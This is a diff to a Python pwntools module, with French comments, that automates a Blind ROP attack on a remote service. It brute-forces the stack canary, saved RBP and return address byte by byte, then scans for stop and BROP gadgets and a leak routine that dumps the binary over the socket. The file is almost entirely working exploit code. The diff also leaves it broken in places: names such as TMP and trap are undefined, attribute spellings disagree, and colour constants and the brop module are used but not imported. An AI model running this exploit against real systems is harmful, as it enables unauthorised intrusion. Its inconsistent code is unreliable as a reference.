@@ -2,14 +2,19 @@
 
 from pwn import *
 import sys
-import brop
 
-from argsprint import *
+from print_tools import cred, cver, cend
+
+# SYNTAX COLOURS AND SYSTEM DATA:
+
+dodo    = 0.06
+
 
 ##### Leaking values #####--------------------------------------------------------------------------
 
 def leakValues(ExploitStructure):
 
+    TMP         = ExploitStructure
     LEAKEDINFO  = []
 
     tabstr  = ['CANARY     ', 'RBP        ', 'RETADR     ']
@@ -17,9 +22,9 @@ def leakValues(ExploitStructure):
 
     while len(LEAKEDINFO) < 3:
 
-        PAYLOADTMP    = ExploitStructure.BUFFER
+        PAYLTMP = TMP.BUFFER
         for VALUE in LEAKEDINFO:
-            PAYLOADTMP += VALUE
+            PAYLTMP += VALUE
 
         LEAKVAL = b''
         OA = 0
@@ -33,12 +38,12 @@ def leakValues(ExploitStructure):
 
             for i in range(256):        # 256 hein
 
-                r = ExploitStructure.remoteConnect()
+                r = TMP.remoteConnect()
 
-                JUNK    = r.recv()      # "Enter"
+                junk        = r.recv()      # "Enter"
 
-                CHAR    = bytes([i])
-                PAYLOAD = PAYLOADTMP + LEAKVAL + CHAR
+                CHAR        = bytes([i])
+                payload     = PAYLTMP + LEAKVAL + CHAR
 
 
                 if OA == 3:                     # Il arrive parfois que l'un des chars soit un 0xA
@@ -52,35 +57,35 @@ def leakValues(ExploitStructure):
                     continue    # pas de segfault
                      
 
-                r.send(PAYLOAD)
-                sleep(DODO)
+                r.send(payload)
+                sleep(dodo)
 
-                RESP    = r.recv()
+                resp    = r.recv()
                 NUM     = len(LEAKEDINFO) + 1
 
-                print(CPUR + "[-] Leaked value (#{}) : 0x".format(NUM) + CHAR.hex() + (LEAKVAL[::-1].hex()) + CEND, end='\r')
+                print(CPUR + '[-] Leaked value (#{}) : 0x'.format(NUM) + CHAR.hex() + (LEAKVAL[::-1].hex()) + CEND, end='\r')
 
                 ### Propre au binaire attaque (a optimiser)
                 '''
                 if NUM == 2 or NUM == 3 and len(LEAKVAL) == 5:
-                    BEGIN   = b'\x00\x00\x7f' 
-                    LEAKVAL += BEGIN[::-1]
+                    begin   = b'\x00\x00\x7f' 
+                    LEAKVAL += begin[::-1]
                     break
                 '''
                 #############################
 
-                if b'Bye' in RESP:
+                if b'Bye' in resp:
                     LEAKVAL += CHAR
                     r.close()
                     break
 
                 ##### Court-circuitage du leak en cas de besoin #####
                 #if NUM == 1:
-                #   LEAKVAL  = ExploitStructure.CANARY
+                #   LEAKVAL  = TMP.CANARY
                 #   r.close()
                 #   break
                 #elif NUM == 2:
-                #   LEAKVAL = ExploitStructure.RBP
+                #   LEAKVAL = TMP.RBP
                 #   r.close()
                 #   break
 
@@ -96,62 +101,64 @@ def leakValues(ExploitStructure):
 
 
                 if(i==255):
-                    printWarn("i raised to 255...")
+                    print(CJAU + "[-] i raised to 255..." + CEND)
                     OA += 1
                     break
 
-        persoPrint(tabstr[indice], LEAKVAL, 0)
+        # virer cette ligne pour ne pas appeler persoPrint dans ce module
+        brop.crPrint(tabstr[indice], LEAKVAL, 0)
         LEAKEDINFO.append(LEAKVAL)
 
         if len(LEAKEDINFO)      == 1:
-            ExploitStructure.CANARY = LEAKVAL
+            TMP.CANARY = LEAKVAL
         elif len(LEAKEDINFO)    == 2:
-            ExploitStructure.RBP = LEAKVAL
+            TMP.RBP = LEAKVAL
         if len(LEAKEDINFO)      == 3:
-            ExploitStructure.RETADR = LEAKVAL
+            TMP.RETADR = LEAKVAL
 
         indice += 1
         
-    return(ExploitStructure)
+    return(TMP)
 
+##########################--------------------------------------------------------------------------
 
-##### STOP GADGET #####-----------------------------------------------------------------------------
+##### stop gadget #####-----------------------------------------------------------------------------
 
-def getStopGadget(ExploitStructure):        # Recuperation d'un Stop Gadget et de l'adresse de base du binaire
+def get_stop_gadget(ExploitStructure):      # Recuperation d'un stop gadget et de l'adresse de base du binaire
 
-    BASETMP    = 0xFFFFFFFFFFFFF000 & u64(ExploitStructure.RETADR) # Il ne s'agit pas forcement de la vrai base du binaire
+    tmpbase = 0xFFFFFFFFFFFFF000 & u64(ExploitStructure.retadr) # Il ne s'agit pas forcement de la vrai base du binaire
                                                     # mais ça fait le taff pour calculer les offsets
-    STOPOFFSET = 0x221
-    return p64(BASETMP + STOPOFFSET)
+    stopoffset = 0x221
+    return p64(tmpbase + stopoffset)
 
-    # v v v v v  PARTIE INUTILE UNE FOIS L'OFFSET DU STOPGADGET DETERMINE  v v v v v
+    # v v v v v  PARTIE INUTILE UNE FOIS L'OFFSET DU stopgadget DETERMINE  v v v v v
 
-    BEGIN   = ExploitStructure.beginning()
-    START   = BASETMP
+    begin   = TMP.beginning()
+    START   = tmpbase
 
     for i in range(START,START+0x1000): # A MODIFIER A LA MAIN EVENTUELLEMENT
 
-        r = ExploitStructure.remoteConnect()
+        r = TMP.remoteConnect()
 
-        JUNK        = r.recv()      # "Enter your choice"
+        junk        = r.recv()      # "Enter your choice"
 
-        PAYLOAD     = BEGIN + p64(i)
+        payload     = begin + p64(i)
 
-        print(CPUR + "[-] Tested Stop Gadget address : " + hex(i) + CEND, end='\r')
+        print(CPUR + "[-] Tested stop gadget address : " + hex(i) + CEND, end='\r')
 
-        r.send(PAYLOAD)
-        sleep(DODO)
+        r.send(payload)
+        sleep(dodo)
 
-        RESP    = r.recv()
+        resp    = r.recv()
 
-        if b'Enter' in RESP:
-            print(CVER + "[+] Potential Stop Gadget located at : " + hex(i) + CEND)
-            OFFSET  = i - BASETMP
+        if b'Enter' in resp:
+            print(CVER + "[+] Potential stop gadget located at : " + hex(i) + CEND)
+            OFFSET  = i - tmpbase
             print(CVER + "[+] Offset from Pseudo Base could be : " + hex(OFFSET) + CEND)
-            print(CJAU + "[!] --> Update getStopGadget() function !" + CEND)
+            print(CJAU + "[!] --> Update getstopgadget() function !" + CEND)
             r.close()
             return p64(i)
-        sleep(DODO)
+        sleep(dodo)
 
         try:
             r.close()
@@ -160,56 +167,56 @@ def getStopGadget(ExploitStructure):        # Recuperation d'un Stop Gadget et d
 
 #######################-----------------------------------------------------------------------------
 
-##### BROP gadget #####----------------------------------------------------------------------------- 
+##### brop gadget #####----------------------------------------------------------------------------- 
 
-def getBropGadget(ExploitStructure):
+def get_brop_gadget(ExploitStructure):
 
-    BASETMP = 0xFFFFFFFFFFFFF000 & u64(ExploitStructure.RETADR) # Il ne s'agit pas forcement de la vrai base du binaire
+    tmpbase = 0xFFFFFFFFFFFFF000 & u64(ExploitStructure.retadr) # Il ne s'agit pas forcement de la vrai base du binaire
                                                     # mais ça fait le taff pour calculer les offsets
-    BROPOFFSET = 0x69A
-    return p64(ExploitStructureBASE + BROPOFFSET)
+    bropoffset = 0x69A
+    return p64(tmpbase + bropoffset)
 
-    # v v v v v  PARTIE INUTILE UNE FOIS L'OFFSET DU STOPGADGET DETERMINE  v v v v v
+    # v v v v v  PARTIE INUTILE UNE FOIS L'OFFSET DU stopgadget DETERMINE  v v v v v
 
-    BEGIN       = ExploitStructure.beginning()
-    START       = BASETMP
-    TRAPGADGET  = ExploitStructure.CRASH
+    begin       = TMP.beginning()
+    START       = tmpbase
+    trap_gadget  = TMP.crash
 
     for i in range(START, START+0x2000):
 
-        r = ExploitStructure.remoteConnect()
+        r = TMP.remoteConnect()
 
-        JUNK        = r.recv()      # "Enter your choice"
+        junk        = r.recv()      # "Enter your choice"
 
-        PAYLOAD     = BEGIN + p64(i) + TRAPGADGET*6 + ExploitStructure.STOPGADGET + TRAPGADGET*6
+        payload     = begin + p64(i) + trap_gadget*6 + TMP.stopgadget + trap_gadget*6
 
-        print(CPUR + '[-] Tested BROP Gadget address : ' + hex(i) + CEND, end='\r')
+        print(CPUR + '[-] Tested brop gadget address : ' + hex(i) + CEND, end='\r')
 
-        r.send(PAYLOAD)
-        sleep(DODO)
+        r.send(payload)
+        sleep(dodo)
 
         #--------------------
-        RESP    = r.recv()
-        if b'Enter' in RESP:
-            print(CJAU + "[+] Potential BROP Gadget located at : " + hex(i) + CEND)
+        resp    = r.recv()
+        if b'Enter' in resp:
+            print(CJAU + "[+] Potential brop gadget located at : " + hex(i) + CEND)
 
             r.close()
 
-            r = ExploitStructure.remoteConnect()
-            JUNK    = r.recv()
+            r = TMP.remoteConnect()
+            junk    = r.recv()
 
-            PAYLOAD = BEGIN + p64(i+7) + TRAPGADGET*2 + ExploitStructure.STOPGADGET
+            payload = begin + p64(i+7) + trap_gadget*2 + TMP.stopgadget
 
-            r.send(PAYLOAD)
-            sleep(DODO)
+            r.send(payload)
+            sleep(dodo)
             
-            RESP = r.recv()
-            if b'Enter' in RESP:
-                print(CVER + "[+] BROP Gadget located at : " + hex(i) + CEND)
+            resp = r.recv()
+            if b'Enter' in resp:
+                print(CVER + "[+] brop gadget located at : " + hex(i) + CEND)
 
-                OFFSET      = i - BASETMP
+                OFFSET      = i - tmpbase
                 print(CVER + "[+] Offset from Pseudo Base could be : " + hex(OFFSET) + CEND)
-                print(CJAU + "[!] --> Update getStopGadget() function !" + CEND)
+                print(CJAU + "[!] --> Update getstopgadget() function !" + CEND)
                 return(p64(i))
 
             sleep(0.03)
@@ -220,26 +227,29 @@ def getBropGadget(ExploitStructure):
         except:
             pass
 
+#####
+
+
 
 #######################-----------------------------------------------------------------------------
 
 ##### Fonction d'Arbitrary Read #####---------------------------------------------------------------
 
-def getLeakFunction(ExploitStructure):  # Recupere une fonction de leak, donc permetant un arbitrary read ; en gros, permet de leak le binaire
+def get_leak_function(ExploitStructure):    # Recupere une fonction de leak, donc permetant un arbitrary read ; en gros, permet de leak le binaire
 
-    BINBASE     = 0xFFFFFFFFFFFFF000 & u64(ExploitStructure.RETADR) - 0x1000
-    LEAKOFFSET  = 0x1000
-    return p64(BINBASE + LEAKOFFSET), p64(BINBASE)
+    binbase     = 0xFFFFFFFFFFFFF000 & u64(ExploitStructure.retadr) - 0x1000
+    leakoffset  = 0x1000
+    return p64(binbase + leakoffset), p64(binbase)
 
-    # v v v v v  PARTIE INUTILE UNE FOIS L'OFFSET DE LA LEAKADR DETERMINE  v v v v v
+    # v v v v v  PARTIE INUTILE UNE FOIS L'OFFSET DE LA leakadr DETERMINE  v v v v v
 
-    BEGIN   = ExploitStructure.beginning()
+    begin   = TMP.beginning()
 
-    BROP7   = p64(u64(ExploitStructure.BROPGADGET) + 0x7)
-    BROP9   = p64(u64(ExploitStructure.BROPGADGET) + 0x9)
-    R15     = b'JUNKJUNK'
+    brop7   = p64(u64(TMP.bropgadget) + 0x7)
+    brop9   = p64(u64(TMP.bropgadget) + 0x9)
+    r15     = b'junkjunk'
 
-    BINBASE = 0xFFFFFFFFFFFFF000 & u64(ExploitStructure.RETADR) - 0x1000    # Deja decrementee pour gagner du temps ^^
+    binbase = 0xFFFFFFFFFFFFF000 & u64(TMP.RETADR) - 0x1000 # Deja decrementee pour gagner du temps ^^
             #       # RSI
 
     LEN     = 0x10  # RDX
@@ -247,117 +257,143 @@ def getLeakFunction(ExploitStructure):  # Recupere une fonction de leak, donc pe
     
     while True:
 
-        for i in range(BINBASE+0x200, BINBASE+0x2000):      # A MODIFIER A LA MAIN EVENTUELLEMENT
+        for i in range(binbase+0x200, binbase+0x2000):      # A MODIFIER A LA MAIN EVENTUELLEMENT
 
-            r = ExploitStructure.remoteConnect()
+            r = TMP.remoteConnect()
 
-            #JUNK       = r.recv()      # "Enter your choice"
+            #junk       = r.recv()      # "Enter your choice"
             
-            ROPCHAIN    = BROP7 + p64(BINBASE) + R15 + BROP9 + p64(SOCKET) + p64(i)
-            PAYLOAD     = BEGIN + ROPCHAIN
-            # ATTENTION : RDX n'est pas peuplé, et le BROP9 fonctionne mal - parait-il -
+            ropchain    = brop7 + p64(binbase) + r15 + brop9 + p64(SOCKET) + p64(i)
+            payload     = begin + ropchain
+            # ATTENTION : RDX n'est pas peuplé, et le brop9 fonctionne mal - parait-il -
 
             print(CPUR + '[-] Tested Leaking address : ' + hex(i) + CEND, end='\r')
 
-            r.send(PAYLOAD)
-            sleep(DODO)
+            r.send(payload)
+            sleep(dodo)
 
             #--------------------
-            RESP    = r.recv()
+            resp    = r.recv()
 
-            if b'ELF' in RESP:
-                OFFSET  = i - BINBASE
+            if b'ELF' in resp:
+                OFFSET  = i - binbase
                 print(CVER + "[+] Leaking function found, offset from Base Address could be : " + hex(OFFSET) + CEND)
                 print(CJAU + "[!] --> Update getLeakAdr() function !" + CEND)
                 r.close()
-                return p64(i), p64(BINBASE)
+                return p64(i), p64(binbase)
 
             try:
                 r.close()
             except:
                 pass
         
-        BINBASE -= 0x1000       # Si pas de resultat, alors on decremente la BINBASE calculee
+        binbase -= 0x1000       # Si pas de resultat, alors on decremente la binbase calculee
 
 #####################################---------------------------------------------------------------
 
 ##### Test des gadgets #####------------------------------------------------------------------------
 
-def testGadget(ExploitStructure, GADGET):
+def test_gadget(ExploitStructure, gadget):
 
-    BEGIN   = ExploitStructure.beginning()
+    begin   = ExploitStructure.beginning()
 
     r    = ExploitStructure.remoteConnect()
-    JUNK = r.recv()
+    junk = r.recv()
 
     #---------------------------------------------------------------------------
-    if GADGET   == 'STOPGADGET':
-        PAYLOAD     = BEGIN + ExploitStructure.STOPGADGET
+    if gadget   == 'stop_gadget':
+        payload     = begin + ExploitStructure.stop_gadget
 
-    elif GADGET == 'BROPGADGET':
-        TRAPGADGET  = ExploitStructure.CRASH
-        PAYLOAD     = BEGIN + ExploitStructure.BROPGADGET + TRAPGADGET*6 + ExploitStructure.STOPGADGET + TRAPGADGET*6
+    elif gadget == 'brop_gadget':
+        trap_gadget  = ExploitStructure.crash
+        payload     = begin + ExploitStructure.brop_gadget + trap_gadget*6 + ExploitStructure.stop_gadget + trap_gadget*6
 
-    elif GADGET == 'LEAKADR':
-        TARGETADR   = ExploitStructure.BINBASE
-        BROP7       = p64(u64(ExploitStructure.BROPGADGET) + 0x7)
-        BROP9       = p64(u64(ExploitStructure.BROPGADGET) + 0x9)
-        R15         = b'JUNKJUNK'
+    elif gadget == 'leak_adr':
+        targetadr   = ExploitStructure.bin_base
 
-        LEN     = 0x10  # RDX
-        SOCKET  = 0x4   # RDI
+        brop7       = p64(u64(ExploitStructure.brop_gadget) + 0x7)
+        brop9       = p64(u64(ExploitStructure.brop_gadget) + 0x9)
+        r15         = b'junkjunk'
+
+        len     = 0x10  # RDX
+        socket  = 0x4   # RDI
         
-        ROPCHAIN    = BROP7 + TARGETADR + R15 + BROP9 + p64(SOCKET) + ExploitStructure.LEAKADR
-        PAYLOAD     = BEGIN + ROPCHAIN
+        ropchain    = brop7 + targetadr + r15 + brop9 + p64(socket) + ExploitStructure.leak_adr
+        payload     = begin + ropchain
     #---------------------------------------------------------------------------
 
-    r.send(PAYLOAD)
-    sleep(DODO)
-    RESP    = r.recv()
+    r.send(payload)
+    sleep(dodo)
+    resp    = r.recv()
 
     #---------------------------------------------------------------------------
-    if b'Enter' in RESP and GADGET == 'BROPGADGET':
+    if b'Enter' in resp and gadget == 'bropgadget':
 
         r.close()
-        BROP7       = p64(u64(ExploitStructure.BROPGADGET) + 0x7)
+        brop7       = p64(u64(ExploitStructure.bropgadget) + 0x7)
 
         r       = ExploitStructure.remoteConnect()
-        JUNK    = r.recv()
+        junk    = r.recv()
 
-        PAYLOAD     = BEGIN + BROP7 + TRAPGADGET*2 + ExploitStructure.STOPGADGET
+        payload     = begin + brop7 + trap*2 + ExploitStructure.stopgadget
 
-        r.send(PAYLOAD)
-        sleep(DODO)
+        r.send(payload)
+        sleep(dodo)
             
-        RESP = r.recv()
-        if b'Enter' in RESP:
-            print(CVER + " ---> is OK" + CEND)
+        resp = r.recv()
+        if b'Enter' in resp:
+            print(cver + " ---> is OK" + cend)
             r.close()
             return
         else:
-            print(CRED + " ---> [!] is wrong (second test fail)" + CEND)
+            print(cred + " ---> [!] is wrong (second test fail)" + cend)
             r.close()
             return
 
 
-    elif b'Enter' in RESP and GADGET == 'STOPGADGET':
-        print(CVER + " ---> is OK" + CEND)
+    elif b'Enter' in resp and gadget == 'stopgadget':
+        print(cver + " ---> is OK" + cend)
         r.close()
         return
 
-    elif b'Enter' not in RESP and GADGET == 'BROPGADGET':
-        print(CRED + " ---> [!] is wrong (first test fail)" + CEND)
+    elif b'Enter' not in resp and gadget == 'bropgadget':
+        print(cver + " ---> [!] is wrong (first test fail)" + cend)
         r.close()
         return
 
-    elif b'ELF' in RESP:
-        print(CVER + " ---> is OK" + CEND)
+    elif b'ELF' in resp:
+        print(cver + " ---> is OK" + cend)
         r.close()
         return
 
     else:
-        print(CRED + " ---> [!] is wrong" + CEND)
+        print(cred + " ---> [!] is wrong" + cend)
         r.close()
         return
 
 
+
+
+def checkBuildID(BUILDID):
+#   TMP = ExploitStructure
+
+    if len(BUILDID) == 40:
+
+        if (re.findall(r"([a-fA-F\d]{40})", BUILDID)):
+            print(CVER + "[+] BuildID    :  " + BUILDID + CEND)
+            return 1
+        #else:
+        #   print(CRED + "[!] Error with given BuildID    : " + TMP.BUILDID + CEND)
+    else:
+        print(CRED + "[!] Error with given BuildID    : " + BUILDID + CEND)
+        """
+        vori si je demande quoi faire genre en remettre un, par exemple :
+            ANOTHER = input(CJAU + "[?] Use specific BuildID ? (y / n) " + CEND)
+            if ANOTHER == 'n':
+                return 0
+            elif ANOTHER == 'y':
+                BUILDID = (input(CJAU + "[:] Put the other BuildID > " + CEND)).strip('\x0A')
+            mais dans ce cas faut passer ee en parametre
+                return 1
+        """
+        return 0
